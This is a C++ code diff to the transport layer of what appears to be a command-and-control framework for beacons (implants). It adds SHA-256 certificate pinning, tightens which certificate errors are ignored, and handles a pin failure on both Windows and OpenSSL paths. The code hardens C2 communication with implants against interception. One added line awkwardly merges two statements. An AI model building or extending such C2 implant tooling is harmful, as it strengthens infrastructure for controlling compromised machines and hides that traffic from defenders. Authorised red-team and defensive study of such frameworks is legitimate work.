@@ -27,6 +27,9 @@
     #endif
     #include <windows.h>
     #include <winhttp.h>
+    // WIN32_LEAN_AND_MEAN above excludes wincrypt.h, but the certificate pin
+    // needs PCCERT_CONTEXT / CertFreeCertificateContext.
+    #include <wincrypt.h>
     #pragma comment(lib, "winhttp.lib")
 #else
     #include <sys/socket.h>
@@ -99,6 +102,94 @@ static std::string json_escape(const std::string& s) {
     return res;
 }
 
+// ── Certificate pin (A-2 parity with the beacon) ───────────────────────────
+// This transport used to accept ANY TLS peer: only the per-beacon HMAC
+// authenticated the POINTER, and only after an unauthenticated channel was
+// already established. When the build carries a pin
+// (BEACON_SERVER_FINGERPRINT, written by phantom.utils.c2_crypto and passed
+// by the remote builder too), the transport hashes the peer's DER
+// certificate and refuses a mismatch — exactly the beacon's rule.
+#ifdef BEACON_SERVER_FINGERPRINT
+    #define REMOTE_PIN_VALUE BEACON_SERVER_FINGERPRINT
+    #define REMOTE_PIN_ENFORCED 1
+#else
+    #define REMOTE_PIN_VALUE ""
+    #define REMOTE_PIN_ENFORCED 0
+#endif
+
+// SHA-256 over arbitrary bytes, lowercase hex (BCrypt on Windows, EVP on
+// OpenSSL). Empty on failure so a failed hash can never be read as "match".
+// Only compiled when a pin is enforced (an unused static function would trip
+// -Werror on a build without a certificate).
+#if REMOTE_PIN_ENFORCED
+static std::string _sha256_hex(const unsigned char* data, size_t len) {
+#ifdef _WIN32
+    BCRYPT_ALG_HANDLE hAlg = nullptr;
+    BCRYPT_HASH_HANDLE hHash = nullptr;
+    std::string out;
+    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM,
+                                                nullptr, 0)))
+        return out;
+    do {
+        DWORD obj_len = 0, cb = 0, hash_len = 0;
+        if (!NT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
+                (PUCHAR)&obj_len, sizeof(obj_len), &cb, 0))) break;
+        if (!NT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH,
+                (PUCHAR)&hash_len, sizeof(hash_len), &cb, 0))) break;
+        std::vector<unsigned char> obj(obj_len), digest(hash_len);
+        if (!NT_SUCCESS(BCryptCreateHash(hAlg, &hHash, obj.data(), obj_len,
+                                         nullptr, 0, 0))) break;
+        if (!NT_SUCCESS(BCryptHashData(hHash, (PUCHAR)data, (ULONG)len, 0))) break;
+        if (!NT_SUCCESS(BCryptFinishHash(hHash, digest.data(), hash_len, 0))) break;
+        out = crypto::hex_encode(digest.data(), digest.size());
+    } while (0);
+    if (hHash) BCryptDestroyHash(hHash);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    return out;
+#else
+    unsigned char digest[EVP_MAX_MD_SIZE];
+    unsigned int n = 0;
+    if (EVP_Digest(data, len, digest, &n, EVP_sha256(), nullptr) != 1)
+        return std::string();
+    return crypto::hex_encode(digest, n);
+#endif
+}
+#endif  // REMOTE_PIN_ENFORCED
+
+#ifdef _WIN32
+static bool _cert_pin_ok(HINTERNET hRequest) {
+#if REMOTE_PIN_ENFORCED
+    PCCERT_CONTEXT cert = nullptr;
+    DWORD len = sizeof(cert);
+    if (!WinHttpQueryOption(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
+                            &cert, &len) || !cert)
+        return false;
+    std::string got = _sha256_hex(cert->pbCertEncoded, cert->cbCertEncoded);
+    CertFreeCertificateContext(cert);
+    return !got.empty() && got == std::string(REMOTE_PIN_VALUE);
+#else
+    (void)hRequest;
+    return true;
+#endif
+}
+#else
+static bool _ssl_pin_ok(SSL* ssl) {
+#if REMOTE_PIN_ENFORCED
+    X509* cert = SSL_get1_peer_certificate(ssl);
+    if (!cert) return false;
+    unsigned char digest[EVP_MAX_MD_SIZE];
+    unsigned int n = 0;
+    bool ok = X509_digest(cert, EVP_sha256(), digest, &n) == 1;
+    X509_free(cert);
+    if (!ok) return false;
+    return crypto::hex_encode(digest, n) == std::string(REMOTE_PIN_VALUE);
+#else
+    (void)ssl;
+    return true;
+#endif
+}
+#endif
+
 #ifdef _WIN32
 // ── WinHTTP transport (WinHTTP is wide-only) ───────────────────────────────
 static std::wstring _to_wide(const std::string& s) {
@@ -128,9 +219,15 @@ static std::string _http_request(const RemoteConfig& cfg, const std::string& met
         cfg.use_https ? WINHTTP_FLAG_SECURE : 0);
     if (!hRequest) { WinHttpCloseHandle(hConnect); return ""; }
 
-    // Accept self-signed C2 certificate (matches beacon behavior).
-    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+    // Accept a self-signed C2 certificate: the CA/CN relaxations only stop
+    // WinHTTP failing the handshake before auth. CERT_DATE_INVALID is NOT
+    // relaxed (A-2 parity with the beacon). The PIN below is what actually
+    // authenticates the peer: CA/CN are ignored precisely because the
+    // certificate is self-signed and the fingerprint, not a CA, is the trust
+    // anchor.
+    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                      SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
     WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
 
     // Headers: identity + HMAC auth (same shape the server verifies).
@@ -157,9 +254,16 @@ static std::string _http_request(const RemoteConfig& cfg, const std::string& met
     BOOL sent = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)-1,
                                    body.empty() ? nullptr : const_cast<char*>(body.data()),
                                    (DWORD)body.size(), (DWORD)body.size(), 0);
-    if (!sent) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return ""; }
-    if (!WinHttpReceiveResponse(hRequest, nullptr)) {
-        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return "";
+    if (!sent) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return ""; }    if (!WinHttpReceiveResponse(hRequest, nullptr)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        return "";
+    }
+    // A-2: the peer must BE the pinned C2, not merely complete a handshake.
+    if (cfg.use_https && !_cert_pin_ok(hRequest)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        return "";
     }
     std::string out;
     DWORD avail = 0;
@@ -202,6 +306,8 @@ static std::string _http_request(const RemoteConfig& cfg, const std::string& met
         if (!ssl) { SSL_CTX_free(ctx); close(fd); return ""; }
         SSL_set_fd(ssl, fd);
         if (SSL_connect(ssl) != 1) { SSL_free(ssl); SSL_CTX_free(ctx); close(fd); return ""; }
+        // A-2: pin the peer certificate (no-op when the build has no pin).
+        if (!_ssl_pin_ok(ssl)) { SSL_free(ssl); SSL_CTX_free(ctx); close(fd); return ""; }
     }
 
     std::string headers = R_S("X-Beacon-Id: ") + beacon_id + "\r\n";
